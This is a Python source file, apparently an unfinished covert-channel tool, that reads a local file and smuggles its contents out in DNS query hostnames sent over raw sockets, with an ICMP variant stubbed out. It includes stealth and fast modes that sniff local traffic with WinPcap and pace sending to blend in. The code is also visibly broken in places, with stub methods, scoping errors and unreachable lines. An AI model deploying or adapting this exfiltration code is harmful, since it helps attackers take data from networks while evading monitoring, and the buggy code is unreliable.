import argparse
import base64
import binascii
import ctypes
import math
import platform
import random
import socket
import string
import struct
import sys
import threading
import time

from ctypes import *
from sys import argv
from winpcapy import *

u_char      = c_ubyte
u_int       = c_int
u_short     = c_ushort

chunkLength         = 20
completedTransfer   = False
currentFilePath     = "secretdoc.txt"
exfilBytes          = b''
ICMP_ECHO_REPLY     = 0
ICMP_ECHO_REQUEST   = 8
intervalLength      = 5
startByte           = 0
updatedPPI          = 10

DNS_REQUEST     = 0
ICMP_PROTOCOL   = socket.getprotobyname('icmp')
UDP_PROTOCOL    = socket.getprotobyname('udp')

# Command line flags
stealthMode = False
fastMode    = False
icmpOnly    = False
dnsOnly     = False
mixedOnly   = False

monitorThread = None

class ICMPPacket:
    def __init__(self, type, code):
        self.type = type
        self.code = code

    def computeChecksum():
        return
    
    def getHeader(self):
        # Type (8), code(8), checksum(16), id(16), sequence(16)
        packetId = int((id(self) * random.random()) % 65535)
        icmpHeader = struct.pack("bbHHh", self.type, self.code, 0, packetId, 0)
        return icmpHeader

    def fill():
        # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
        return
    
class DNSPacket:
    def __init__(self, data):
        self.data = data
        self.QR = 0

    def computeChecksum():
        return
        
    def getHeader(self, length):
        # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
        # All flags are 0 so we can just use an unsigned short (16 bytes) of 0
        # DNS uses UDP so create UDP header first

        packetId = int((id(self) * random.random()) % 65535)
        
        #udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(8 + 18 + 4*math.ceil(chunkLength/3)), 0)
        udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(length), 0)
        dnsHeader = struct.pack("HHHHHH", socket.htons(packetId), 0, socket.htons(1), 0, 0, 0)
        return udpHeader + dnsHeader

    def construct(self):
        # Add hostname terminating byte and final two options
        end = struct.pack("HH", socket.htons(1), socket.htons(1))
        length = len(self.data) + len(end) + 20
        header = self.getHeader(length)

        print("Total packet length: %d" % length)
        return header + self.data + end

def main(q):
    global stealthMode
    global fastMode
    global icmpOnly
    global dnsOnly
    global mixedOnly

    parser = argparse.ArgumentParser(description="Set options for exfiltration")
    parser.add_argument('-s', dest="stealth", action="store_true", default=False, required=False)
    parser.add_argument('-f', dest="fast", action="store_true", default=False, required=False)
    parser.add_argument('-i', dest="icmp", action="store_true", default=False, required=False)
    parser.add_argument('-d', dest="dns", action="store_true", default=False, required=False)
    parser.add_argument('-m', dest="mixed", action="store_true", default=False, required=False)

    args = parser.parse_args()

    ret = False
    if args.stealth & args.fast:
        print("Error: -s and -f are mutually exclusive")
        ret = True
    if args.icmp & args.dns:
        print("Error: Use -m for ICMP and DNS")
        ret = True
    if ret:
        return

    stealthMode = args.stealth
    fastMode    = args.fast
    icmpOnly    = args.icmp
    dnsOnly     = args.dns
    mixedOnly   = args.mixed

    init()

    return

    
def init():
    global exfilBytes
    startByte = 0
    exfilBytes = readFile(currentFilePath, "rb")

    if stealthMode:     
        monitorThread = threading.Thread(None, monitorNetwork)
        monitorThread.start()
    loop()

def loop():

    if fastMode:
        k = 48 # Constant of proportionality between delay and ppi
        localPPI = updatedPPI
        delay = k / localPPI

    # While the whole file hasn't be exfiltrated
    while startByte < (len(exfilBytes) - 1):
        if fastMode:       
            print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
            # If the monitor has updated the PPI value, then update the delay between packets
            if localPPI != updatedPPI:
                print("Updating delay")
                localPPI = updatedPPI
                delay = k/localPPI
                print("New delay: %f" % (delay))        

        # Send next chunk
        sendNext("8.8.8.8", UDP_PROTOCOL)
        print("Packet sent")

        if fastMode:
            time.sleep(delay)
    return

    completedTransfer = True
    
def createICMPPacket():
    icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0)
    icmpHeader = icmpPacket.getHeader()
    data = getNextChunk(startByte, chunkLength)
    
    return icmpHeader #+ data

def createDNSPacket():
    queryHostname = b''

    if fastMode == True:
        print("Creating fast mode DNS packet")
        # (62).(62).(62).(62)
        for i in range(0, 4):
            chunkLength = 62
            data = getNextChunk(startByte, chunkLength)
            #data = base64.b32encode(data)
            data = len(data).to_bytes(1, "little") + data
            queryHostname += data

        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name
    else:
        print("Hey")
        # Adjust chunk length accordingly
        for i in range(0, 4):
            chunkLength = math.floor(random.random() * 30)
            data = getNextChunk(startByte, chunkLength)
            #data = base64.b32encode(data)
            data = len(data).to_bytes(1, "little") + data
            queryHostname += data

        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name

    dnsPacket = DNSPacket(queryHostname).construct()

    return dnsPacket

def stringToDNSQuery(s):
    labels = s.split(".")
    output = ""
    for i in range(len(labels)):
        output += str(len(labels[i])) + labels[i]
    output += '0' # Add labels terminator
    return output

def getNextChunk(sb, cl):
    global startByte
    chunk = b''
    # Check if chunk overlaps end of file
    if (sb + cl) > (len(exfilBytes) - 1):
        # If yes then set the chunk size to the remainder of the file
        chunkLength = len(exfilBytes) - sb

        # Need to send EOF
    for i in range(sb, sb + cl):
        chunk += exfilBytes[i:i+1]
    startByte += cl
    return chunk

def sendStartOfFile():
    #createPacket(1)
    return
    
def sendEndOfFile():
    #createPacket(2)
    return
    
def stringToBin(s):
    b = bytearray()
    for i in s:
        if i.isdigit() != True:
            b.append(ord(i))
        else:
            b.append(int(i))

    # Convert bytes to bin endian
    for i in b:
        if isinstance(i, int) != True:
            i = socket.htons(i)
    return b
  
def readFile(name, mode):
    fileBytes = b''
    # Use 'rb' mode for reading in binary
    f = open(name, mode)
    try:
        byte = f.read(1)
        while byte != b'':
            fileBytes += byte
            byte = f.read(1)
    finally:
        f.close()
    return fileBytes

def sendNext(dest_addr, code, timeout=1):
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, code)
    except socket.error as e:
        #if e.errno in ERROR_DESCR:
            # Operation not permitted
        #    raise socket.error(''.join((e.args[1], ERROR_DESCR[e.errno])))
        raise # raise the original error
    try:
        host = socket.gethostbyname(dest_addr)
    except socket.gaierror:
        return
    # Maximum for an unsigned short int c object counts to 65535 so
    # we have to sure that our packet id is not greater than that.
    #packet = createICMPPacket()
    packet = createDNSPacket()
    while packet:
        # The icmp protocol does not use a port, but the function
        # below expects it, so we just give it a dummy port.
        sent = my_socket.sendto(packet, (dest_addr, 1))
        packet = packet[sent:]
    #delay = receive_ping(my_socket, packet_id, time.time(), timeout)
    my_socket.close()
    #return delay
    return

class ip_address(Structure):
    _fields_ = [("byte1", u_char),
                ("byte2", u_char),
                ("byte3", u_char),
                ("byte4", u_char)]


class ip_header(BigEndianStructure):
    _fields_ = [("ver_ihl", u_char),
                ("tos", u_char),
                ("tlen", u_short),
                ("identification", u_short),
                ("flags_fo", u_short),
                ("ttl", u_char),
                ("proto", u_char),
                ("crc", u_short),
                ("saddr", ip_address),
                ("daddr", ip_address),
                ("op_pad", u_int)]


class udp_header(BigEndianStructure):
    _fields_ = [("sport", u_short),
                ("dport", u_short),
                ("len", u_short),
                ("crc", u_short)]

pktCount = 0
intervalTime = 10
capturing = True
captureLength = 2
timeBetweenListens = 5

if platform.python_version()[0] == "3":
    raw_input=input
#/* prototype of the packet handler */
#void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
PHAND=CFUNCTYPE(None,POINTER(c_ubyte),POINTER(pcap_pkthdr),POINTER(c_ubyte))

def monitorNetwork():
    global capturing
    global updatedPPI
    
    packet_handler=PHAND(_packet_handler)
    alldevs=POINTER(pcap_if_t)()
    errbuf= create_string_buffer(PCAP_ERRBUF_SIZE)
    ## Retrieve the device list
    if (pcap_findalldevs(byref(alldevs), errbuf) == -1):
            print ("Error in pcap_findalldevs: %s\n" % errbuf.value)
            sys.exit(1)
    '''
    ## Print the list
    i=0
    try:
            d=alldevs.contents
    except:
            print ("Error in pcap_findalldevs: %s" % errbuf.value)
            print ("Maybe you need admin privilege?\n")
            sys.exit(1)
    while d:
            i=i+1
            print("%d. %s" % (i, d.name))
            if (d.description):
                    print (" (%s)\n" % (d.description))
            else:
                    print (" (No description available)\n")
            if d.next:
                    d=d.next.contents
            else:
                    d=False

    if (i==0):
            print ("\nNo interfaces found! Make sure WinPcap is installed.\n")
            sys.exit(-1)
    print ("Enter the interface number (1-%d):" % (i))
    inum= raw_input('--> ')
    if inum in string.digits:
            inum=int(inum)
    else:
            inum=0
    if ((inum < 1) | (inum > i)):
            print ("\nInterface number out of range.\n")
            ## Free the device list
            pcap_freealldevs(alldevs)
            sys.exit(-1)
    '''
    inum = 5
    ## Jump to the selected adapter
    d=alldevs
    for i in range(0,inum-1):
            d=d.contents.next
    ## Open the device 
    ## Open the adapter
    d=d.contents
    adhandle = pcap_open_live(d.name,65536,1,1000,errbuf)
    if (adhandle == None):
            print("\nUnable to open the adapter. %s is not supported by Pcap-WinPcap\n" % d.contents.name)
            ## Free the device list
            pcap_freealldevs(alldevs)
            sys.exit(-1)
    print("\nlistening on %s...\n" % (d.description))
    ## At this point, we don't need any more the device list. Free it
    pcap_freealldevs(alldevs)
    # Start capturing, set large packet capture size because we want to stop before this is reached

    while not completedTransfer:
        print("Starting capture")
        start = time.clock()
        pktCount = 0
        while(capturing):
            pcap_dispatch(adhandle, 1, packet_handler, None)
            pktCount += 1
            if (time.clock() - start) >= captureLength:
                break;
        #pcap_close(adhandle)
        #print("Number of packets received in %d seconds: %d" % (captureLength, pktCount))
        updatedPPI = pktCount
        print("updatedPPI: %d" % (pktCount))
        time.sleep(timeBetweenListens)
    return

def _packet_handler(param,header,pkt_data):
    global pktCount
    '''
    # cast pkt_data to void so we can do some pointer arithmetic
    v_pkt_data = ctypes.cast(pkt_data, ctypes.c_void_p)

    # retrieve the position of the ip header
    v_ip_header = ctypes.c_void_p(v_pkt_data.value + 14)
    pih = ctypes.cast(v_ip_header, ctypes.POINTER(ip_header))
    ih = pih.contents

    # retrieve the position of the udp header
    ip_len = (ih.ver_ihl & 0xf) * 4
    uh = ctypes.cast(ctypes.cast(pih, ctypes.c_void_p).value + ip_len,
                     ctypes.POINTER(udp_header)).contents

    # convert from network byte order to host byte order
    sport = socket.ntohs(uh.sport)
    dport = socket.ntohs(uh.dport)

    print("{}.{}.{}.{}:{} -> {}.{}.{}.{}:{}".format(
        ih.saddr.byte1, ih.saddr.byte2, ih.saddr.byte3, ih.saddr.byte4, sport,
        ih.daddr.byte1, ih.daddr.byte2, ih.daddr.byte3, ih.daddr.byte4, dport))

    # Extracting data
    #

    # data offset from ip header start
    data_offset = ip_len + ctypes.sizeof(udp_header)
    # data length
    data_len = ih.tlen - ip_len - ctypes.sizeof(udp_header)
    # get data
    arr_type = (ctypes.c_uint8 * data_len)
    data = arr_type.from_address(v_ip_header.value + data_offset)

    #print(data[0:data_len])

    # note: same thing could be achieved from pkt_data
    #print(pkt_data[14+data_offset:14+data_offset+data_len])
    '''
    # Record values relating to the packet type
    pktCount += 1
    return

if __name__ == "__main__":
    main(sys.argv)
